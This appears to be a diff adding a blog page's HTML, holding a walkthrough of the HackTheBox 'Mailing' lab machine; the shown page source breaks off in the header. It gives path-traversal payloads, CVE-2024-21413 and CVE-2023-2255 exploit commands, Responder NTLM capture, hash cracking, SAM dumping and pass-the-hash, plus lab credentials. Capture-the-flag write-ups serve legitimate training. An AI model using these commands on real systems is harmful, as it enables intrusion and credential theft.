@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Mailing Writeup | Rezy Dev</title>
+<meta name="keywords" content="HackTheBox, Windows, Easy">
+<meta name="description" content="Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap
+I ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.
+PORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/posts/hackthebox/mailing/">
+<meta name="google-site-verification" content="XYZabc">
+<meta name="yandex-verification" content="XYZabc">
+<meta name="msvalidate.01" content="XYZabc">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="mask-icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/hackthebox/mailing/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Mailing Writeup" />
+<meta property="og:description" content="Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap
+I ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.
+PORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/hackthebox/mailing/" />
+<meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E" />
+<meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-09-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-12T00:00:00+00:00" /><meta property="og:site_name" content="Rezy Dev" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E" />
+<meta name="twitter:title" content="Mailing Writeup"/>
+<meta name="twitter:description" content="Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap
+I ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.
+PORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Mailing Writeup",
+      "item": "http://localhost:1313/posts/hackthebox/mailing/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Mailing Writeup",
+  "name": "Mailing Writeup",
+  "description": "Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\nPORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.",
+  "keywords": [
+    "HackTheBox", "Windows", "Easy"
+  ],
+  "articleBody": " Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\nPORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine’s services and configurations.\nPORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Mailing 110/tcp open pop3 syn-ack hMailServer pop3d |_pop3-capabilities: USER TOP UIDL 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 143/tcp open imap syn-ack hMailServer imapd |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 445/tcp open microsoft-ds? syn-ack 465/tcp open ssl/smtp syn-ack hMailServer smtpd | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 587/tcp open smtp syn-ack hMailServer smtpd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 993/tcp open ssl/imap syn-ack hMailServer imapd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 5040/tcp open unknown syn-ack 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp open pando-pub? syn-ack 47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack Microsoft Windows RPC 49665/tcp open msrpc syn-ack Microsoft Windows RPC 49666/tcp open msrpc syn-ack Microsoft Windows RPC 49667/tcp open msrpc syn-ack Microsoft Windows RPC 55959/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 29452/tcp): CLEAN (Timeout) | Check 2 (port 39838/tcp): CLEAN (Timeout) | Check 3 (port 37492/udp): CLEAN (Timeout) | Check 4 (port 25477/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2024-05-05T11:59:54 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -4m48s After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.\nI stumbled upon an intriguing configuration file path while analyzing the payload: ..\\..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.INI. This discovery was inspired by an old exploit I found at https://www.exploit-db.com/exploits/7012. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the hMailServer.INI file.\n[Directories] ProgramFolder=C:\\Program Files (x86)\\hMailServer DatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database DataFolder=C:\\Program Files (x86)\\hMailServer\\Data LogFolder=C:\\Program Files (x86)\\hMailServer\\Logs TempFolder=C:\\Program Files (x86)\\hMailServer\\Temp EventFolder=C:\\Program Files (x86)\\hMailServer\\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 [Database] Type=MSSQLCE Username= Password=0a9f8ad8bf896b501dde74f08efd7e4c PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1 I attempted to crack the MD5 hashes using hashcat with the command hashcat.exe -m0 myhash.txt rockyou.txt. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as homenetworkingadministrator.\nHowever, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at https://github.com/GitMirar/hMailDatabasePasswordDecrypter. This tool specializes in decrypting blowfish-encrypted hMail database passwords.\n┌──(root㉿kali)-[/HTB] └─# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git Cloning into 'hMailDatabasePasswordDecrypter'... remote: Enumerating objects: 8, done. remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8 Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done. ┌──(root㉿kali)-[/HTB] └─# cd hMailDatabasePasswordDecrypter ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# ls blowfish.cpp blowfish.h blowfish.h2 main.cpp Makefile README.md ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# make g++ blowfish.cpp main.cpp -o decrypt ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c 6FC6F69152AD Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn’t functioning as expected.\nUser Root After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability, I proceeded to run Responder on my Kali machine using the command sudo responder -I tun0.\n(Note: If Responder doesn’t return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)\nAfter running Responder, I executed the following command:\n┌──(root㉿kali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability] └─# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi' CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC. Alexander Hagenah / @xaitax / ah@primepage.de ✅ Email sent successfully. After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.\nmaya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000 I cracked the above hash with the following command:\nhashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable Our password is: m4y4ngs4ri. I used this password with the following command to establish a shell: evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri. This successfully granted me access to the system, and I was able to retrieve the user flag.\nRoot Flag I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (https://github.com/elweth-sec/CVE-2023-2255).\nTo exploit this vulnerability, I executed the following Python code:\npython3 CVE-2023-2255.py --cmd 'net localgroup Administrators maya /add' --output 'exploit.odt' This generated an exploit file named exploit.odt.\nNext, I launched an Impacket SMB server using the command:\nimpacket-smbserver mailing `pwd` -smb2support Then, within the Evil-WinRM shell, I executed the following commands:\nnet use \\\\10.10.14.98\\mailing copy \\\\10.10.14.98\\mailing\\exploit.odt These commands allowed me to access the exploit file from the SMB server.\nAfter copying the exploit.odt file from the SMB server, I waited for a few moments. Then, to confirm that the user maya had elevated privileges to administrator, I executed the command net user maya.\nWith confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:\ncrackmapexec smb 10.10.11.14 -u maya -p \"m4y4ngs4ri\" --sam This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.\n┌──(kali㉿kali)-[~] └─$ crackmapexec smb 10.10.11.14 -u maya -p \"m4y4ngs4ri\" --sam [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing WINRM protocol database [*] Initializing LDAP protocol database [*] Initializing RDP protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.11.14 445 MAILING [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False) SMB 10.10.11.14 445 MAILING [+] MAILING\\maya:m4y4ngs4ri (Pwn3d!) SMB 10.10.11.14 445 MAILING [+] Dumping SAM hashes SMB 10.10.11.14 445 MAILING Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c::: SMB 10.10.11.14 445 MAILING localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae::: SMB 10.10.11.14 445 MAILING maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af::: SMB 10.10.11.14 445 MAILING [+] Added 6 SAM hashes to the database Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.\nI’ll use the following command with impacket-wmiexec:\nimpacket-wmiexec localadmin@10.10.11.14 -hashes \"aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\" This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.\nThere we go! We now have access to the local administrator account. We’ve successfully rooted this easy Windows box. Great job!\nConclusion: Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! 🫡\n",
+  "wordCount" : "1672",
+  "inLanguage": "en",
+  "image": "http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished": "2024-09-12T00:00:00Z",
+  "dateModified": "2024-09-12T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/hackthebox/mailing/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Rezy Dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Rezy Dev (Alt + H)">
+                <img src="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png" alt="" aria-label="logo"
